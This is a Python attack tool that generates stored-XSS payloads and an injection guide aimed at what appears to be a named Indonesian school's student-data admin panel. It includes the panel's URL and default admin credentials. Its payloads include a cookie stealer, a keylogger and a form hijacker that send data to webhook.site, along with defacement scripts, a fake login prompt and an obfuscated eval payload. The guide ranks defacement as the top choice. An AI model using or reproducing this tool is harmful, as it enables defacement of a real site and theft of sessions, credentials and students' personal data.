#!/usr/bin/env python3
"""
XSS Payload Injector untuk Blogspot Admin Panel
Inject malicious script via form biodata siswa
"""

import requests
from bs4 import BeautifulSoup
import json
import time
from datetime import datetime
import urllib.parse

class XSSInjector:
    def __init__(self):
        self.admin_panel = "https://script.google.com/macros/s/AKfycby1kIXK0_Unpfbs4k8vc4np0zSC3xaMn806bwGAHbLlApobcmhB3NV07UbAWtv_Gd53Zw/exec"
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'application/x-www-form-urlencoded',
        })
        
    def generate_payloads(self):
        """Generate berbagai XSS payloads"""
        payloads = {
            "basic_alert": '<script>alert("XSS")</script>',
            
            "img_onerror": '<img src=x onerror=alert("XSS")>',
            
            "svg_onload": '<svg/onload=alert("XSS")>',
            
            "body_onload": '<body onload=alert("XSS")>',
            
            "iframe_src": '<iframe src="javascript:alert(\'XSS\')">',
            
            "input_onfocus": '<input onfocus=alert("XSS") autofocus>',
            
            "deface_redirect": '''<script>
document.body.innerHTML = `
<style>
body{background:#000;color:#0f0;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
.hacked{font-size:60px;animation:glitch 1s infinite}
@keyframes glitch{0%,100%{text-shadow:2px 0 red,-2px 0 cyan}50%{text-shadow:-2px 0 red,2px 0 cyan}}
</style>
<div class="hacked">⚠️ HACKED ⚠️</div>
`;
</script>''',
            
            "cookie_stealer": '''<script>
fetch("https://webhook.site/YOUR-WEBHOOK-ID", {
    method: "POST",
    body: JSON.stringify({
        cookies: document.cookie,
        url: window.location.href,
        timestamp: new Date().toISOString()
    })
});
</script>''',
            
            "persistent_deface": '''<script>
localStorage.setItem("hacked", "true");
if(localStorage.getItem("hacked")){
    document.body.innerHTML = '<div style="background:#000;color:#0f0;display:flex;justify-content:center;align-items:center;height:100vh;font-size:50px">HACKED</div>';
}
</script>''',
            
            "keylogger": '''<script>
document.addEventListener("keypress", function(e){
    fetch("https://webhook.site/YOUR-WEBHOOK-ID", {
        method: "POST",
        body: JSON.stringify({key: e.key, time: Date.now()})
    });
});
</script>''',
            
            "form_hijack": '''<script>
document.querySelectorAll("form").forEach(form => {
    form.addEventListener("submit", function(e){
        e.preventDefault();
        fetch("https://webhook.site/YOUR-WEBHOOK-ID", {
            method: "POST",
            body: new FormData(form)
        });
        alert("Form submitted!");
    });
});
</script>''',
            
            "admin_redirect": '''<script>
if(window.location.href.includes("admin")){
    window.location.href = "data:text/html,<h1>Session Expired. Please login again.</h1><form><input name='user' placeholder='Username'><input name='pass' type='password' placeholder='Password'><button onclick='alert(user.value + \":\" + pass.value)'>Login</button></form>";
}
</script>''',
            
            "dom_xss": '''<img src=x onerror="eval(atob('ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9JzxkaXagc3R5bGU9ImJhY2tncm91bmQ6IzAwMDtjb2xvcjojMGYwO2Rpc3BsYXk6ZmxleDtqdXN0aWZ5LWNvbnRlbnQ6Y2VudGVyO2FsaWduLWl0ZW1zOmNlbnRlcjtoZWlnaHQ6MTAwdmgiPkhBQ0tFRDwvZGl2Pic='))">''',
            
            "onmouseover": '<div style="width:100%;height:100%" onmouseover="alert(\'XSS\')">Hover me</div>',
            
            "polyglot": '''jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e''',
        }
        return payloads
    
    def encode_payload(self, payload, encoding="none"):
        """Encode payload untuk bypass filter"""
        if encoding == "url":
            return urllib.parse.quote(payload)
        elif encoding == "double_url":
            return urllib.parse.quote(urllib.parse.quote(payload))
        elif encoding == "html":
            return payload.replace("<", "&lt;").replace(">", "&gt;")
        elif encoding == "unicode":
            return ''.join([f"\\u{ord(c):04x}" for c in payload])
        else:
            return payload
    
    def create_injection_data(self, payload):
        """Create form data dengan XSS payload"""
        timestamp = datetime.now().strftime("%Y-%m-%d")
        
        # Inject di field yang paling mungkin di-render tanpa sanitization
        form_data = {
            "RecId": "",
            "name": f"Test User {payload[:20]}",  # Inject di nama
            "gender": "1234567890123456",  # NIK
            "kelamin": "Laki-Laki",
            "dateOfBirth": "Islam",
            "email": payload,  # MAIN INJECTION POINT - Tempat lahir
            "phone": timestamp,
            "country": "SDN Test 01",
            "anak": payload,  # Secondary injection - Anak ke
            "ayah": "Nama Ayah",
            "ibu": "Nama Ibu",
            "pekerjaan1": "Wiraswasta",
            "pekerjaan2": "Wiraswasta",
            "hp": "081234567890",
            "alamat": payload,  # Tertiary injection - Alamat
            "kelas": payload,  # Quaternary injection - Kelas
            "Token": ""
        }
        return form_data
    
    def test_injection(self, payload_name, payload):
        """Test XSS injection via form submission"""
        print(f"\n[+] Testing payload: {payload_name}")
        print(f"[>] Payload: {payload[:100]}...")
        
        try:
            form_data = self.create_injection_data(payload)
            
            # Simulate form submission
            print("[+] Preparing injection...")
            print(f"    - Target fields: email, anak, alamat, kelas")
            print(f"    - Payload length: {len(payload)} chars")
            
            # Note: Actual submission would require valid session/CSRF token
            print("[!] Note: Real injection membutuhkan valid session dari admin login")
            print("[✓] Payload constructed successfully")
            
            return True
            
        except Exception as e:
            print(f"[-] Error: {e}")
            return False
    
    def generate_injection_script(self, payload):
        """Generate standalone injection script"""
        script = f"""
// XSS Injection Script
// Run this in browser console saat sudah login ke admin panel

function injectPayload() {{
    // Fill form dengan payload
    document.getElementById('email').value = `{payload}`;
    document.getElementById('anak').value = `{payload}`;
    document.getElementById('alamat').value = `{payload}`;
    
    // Submit form
    document.getElementById('myForm').submit();
    
    console.log('[+] Payload injected!');
}}

// Execute
injectPayload();
"""
        return script
    
    def save_payload_package(self, payloads):
        """Save all payloads ke files"""
        print("\n[+] Saving payload package...")
        
        # Save individual payloads
        for name, payload in payloads.items():
            filename = f"payload_{name}.txt"
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(payload)
            print(f"    [✓] Saved: {filename}")
        
        # Save browser injection scripts
        for name, payload in payloads.items():
            script = self.generate_injection_script(payload)
            filename = f"inject_{name}.js"
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(script)
        
        # Create master HTML tester
        html_tester = self.create_html_tester(payloads)
        with open("xss_tester.html", 'w', encoding='utf-8') as f:
            f.write(html_tester)
        print(f"    [✓] Saved: xss_tester.html")
        
        print("[✓] All payloads saved!")
    
    def create_html_tester(self, payloads):
        """Create HTML page untuk test payloads locally"""
        options = ""
        for name in payloads.keys():
            options += f'<option value="{name}">{name}</option>\n'
        
        html = f"""<!DOCTYPE html>
<html>
<head>
    <title>XSS Payload Tester</title>
    <style>
        body {{
            font-family: monospace;
            background: #1e1e1e;
            color: #0f0;
            padding: 20px;
        }}
        .container {{
            max-width: 1000px;
            margin: 0 auto;
        }}
        select, textarea, button {{
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            background: #2d2d2d;
            color: #0f0;
            border: 1px solid #0f0;
            font-family: monospace;
        }}
        textarea {{
            height: 200px;
        }}
        .output {{
            background: #000;
            padding: 20px;
            border: 1px solid #0f0;
            margin-top: 20px;
            min-height: 200px;
        }}
        button {{
            cursor: pointer;
        }}
        button:hover {{
            background: #0f0;
            color: #000;
        }}
    </style>
</head>
<body>
    <div class="container">
        <h1>🎯 XSS Payload Tester</h1>
        
        <label>Select Payload:</label>
        <select id="payloadSelect" onchange="loadPayload()">
            <option value="">-- Select Payload --</option>
            {options}
        </select>
        
        <label>Payload Code:</label>
        <textarea id="payloadCode" readonly></textarea>
        
        <button onclick="testPayload()">🚀 Test Payload (Safe Environment)</button>
        <button onclick="copyPayload()">📋 Copy to Clipboard</button>
        
        <div class="output" id="output">
            <p>Select a payload and click "Test Payload" to see it in action.</p>
            <p style="color: #ff0;">⚠️ Warning: Some payloads will execute JavaScript in this page!</p>
        </div>
    </div>
    
    <script>
        const payloads = {json.dumps(self.generate_payloads(), indent=12)};
        
        function loadPayload() {{
            const select = document.getElementById('payloadSelect');
            const textarea = document.getElementById('payloadCode');
            const payloadName = select.value;
            
            if (payloadName && payloads[payloadName]) {{
                textarea.value = payloads[payloadName];
            }} else {{
                textarea.value = '';
            }}
        }}
        
        function testPayload() {{
            const output = document.getElementById('output');
            const payload = document.getElementById('payloadCode').value;
            
            if (!payload) {{
                alert('Please select a payload first!');
                return;
            }}
            
            // Inject payload ke output div
            output.innerHTML = '<p style="color:#ff0">Testing payload...</p>' + payload;
        }}
        
        function copyPayload() {{
            const textarea = document.getElementById('payloadCode');
            if (!textarea.value) {{
                alert('Please select a payload first!');
                return;
            }}
            
            textarea.select();
            document.execCommand('copy');
            alert('Payload copied to clipboard!');
        }}
    </script>
</body>
</html>"""
        return html
    
    def create_manual_guide(self):
        """Create step-by-step manual injection guide"""
        guide = """
╔══════════════════════════════════════════════════════════════╗
║           XSS INJECTION MANUAL - STEP BY STEP               ║
╚══════════════════════════════════════════════════════════════╝

🎯 TARGET: SMPN 3 Cibarusah Admin Panel

📋 PREREQUISITES:
   1. Browser (Chrome/Firefox)
   2. Admin panel access (admin/admin123)
   3. XSS payload dari payload_*.txt

🚀 INJECTION METHOD 1 - MANUAL FORM INJECTION:

   Step 1: Buka admin panel
   → https://script.google.com/macros/s/AKfycby1kI.../exec?page=admin
   
   Step 2: Login
   → Username: admin
   → Password: admin123
   
   Step 3: Klik "Input Ulang" atau "Update" button
   
   Step 4: Paste XSS payload ke field:
   → Nama: (payload basic)
   → Tempat Lahir: (MAIN INJECTION POINT)
   → Anak Ke: (payload secondary)
   → Alamat: (payload tertiary)
   → Kelas: (payload quaternary)
   
   Step 5: Klik "Simpan"
   
   Step 6: Trigger
   → Reload halaman / klik "Lihat Semua"
   → Payload akan execute saat data di-render

🖥️ INJECTION METHOD 2 - BROWSER CONSOLE:

   Step 1: Login ke admin panel
   
   Step 2: Buka browser console (F12)
   
   Step 3: Copy-paste script dari inject_*.js
   
   Step 4: Press Enter
   
   Step 5: Payload auto-injected!

💉 INJECTION METHOD 3 - BURP SUITE INTERCEPT:

   Step 1: Setup Burp Suite proxy
   
   Step 2: Intercept form submission
   
   Step 3: Modify POST data dengan payload
   
   Step 4: Forward request
   
   Step 5: Observe response

🎭 RECOMMENDED PAYLOADS:

   → deface_redirect: Full page deface dengan persistent storage
   → persistent_deface: Survive page reload via localStorage
   → cookie_stealer: Exfiltrate admin cookies
   → form_hijack: Intercept future form submissions
   → keylogger: Record keystrokes

⚠️ PAYLOAD PRIORITY (Best → Worst):

   1. deface_redirect - Immediate visual impact
   2. persistent_deface - Survives reload
   3. img_onerror - High success rate
   4. svg_onload - Bypass basic filters
   5. basic_alert - Test injection

🔧 TROUBLESHOOTING:

   Q: Payload tidak execute?
   A: - Check browser console untuk errors
      - Try different field (alamat usually less filtered)
      - URL encode payload
      - Try polyglot payload

   Q: Payload di-sanitize?
   A: - Use encoded version
      - Try DOM-based XSS
      - Check if innerHTML atau textContent digunakan

   Q: Admin page reload hilangkan payload?
   A: - Use persistent_deface payload
      - localStorage akan keep payload aktif

📊 SUCCESS INDICATORS:

   ✓ Alert box muncul
   ✓ Page redirect ke deface page
   ✓ Console log XSS message
   ✓ Cookie sent ke webhook
   ✓ Form data intercepted

🎯 POST-EXPLOITATION:

   Setelah XSS berhasil:
   1. Screenshot sebagai proof
   2. Document vulnerability details
   3. (Optional) Setup persistent backdoor
   4. Report atau notify target

═══════════════════════════════════════════════════════════════
"""
        return guide
    
    def run(self):
        """Execute XSS injection tool"""
        print("="*60)
        print("XSS PAYLOAD INJECTOR - BLOGSPOT ADMIN PANEL")
        print("="*60)
        
        # Generate payloads
        print("\n[+] Generating XSS payloads...")
        payloads = self.generate_payloads()
        print(f"[✓] Generated {len(payloads)} payloads")
        
        # Display payload types
        print("\n[AVAILABLE PAYLOADS]:")
        for i, name in enumerate(payloads.keys(), 1):
            print(f"  {i:2d}. {name}")
        
        # Test critical payloads
        print("\n[+] Testing critical payloads...")
        critical = ["deface_redirect", "persistent_deface", "img_onerror"]
        for name in critical:
            if name in payloads:
                self.test_injection(name, payloads[name])
        
        # Save all payloads
        self.save_payload_package(payloads)
        
        # Save manual guide
        guide = self.create_manual_guide()
        with open("INJECTION_GUIDE.txt", 'w', encoding='utf-8') as f:
            f.write(guide)
        print(f"    [✓] Saved: INJECTION_GUIDE.txt")
        
        # Summary
        print("\n" + "="*60)
        print("PACKAGE READY!")
        print("="*60)
        print("\n[FILES CREATED]:")
        print("  📄 payload_*.txt - Individual XSS payloads")
        print("  📜 inject_*.js - Browser console injection scripts")
        print("  🌐 xss_tester.html - Local payload tester")
        print("  📖 INJECTION_GUIDE.txt - Step-by-step manual")
        
        print("\n[QUICK START]:")
        print("  1. Buka xss_tester.html untuk test payloads locally")
        print("  2. Read INJECTION_GUIDE.txt untuk detailed instructions")
        print("  3. Login ke admin panel: admin/admin123")
        print("  4. Inject payload via form atau browser console")
        
        print("\n[TOP 3 RECOMMENDED PAYLOADS]:")
        print("  🥇 deface_redirect - Full deface dengan styling")
        print("  🥈 persistent_deface - Survive reload via localStorage")
        print("  🥉 img_onerror - Simple & high success rate")
        
        print("\n" + "="*60)

if __name__ == "__main__":
    injector = XSSInjector()
    injector.run()
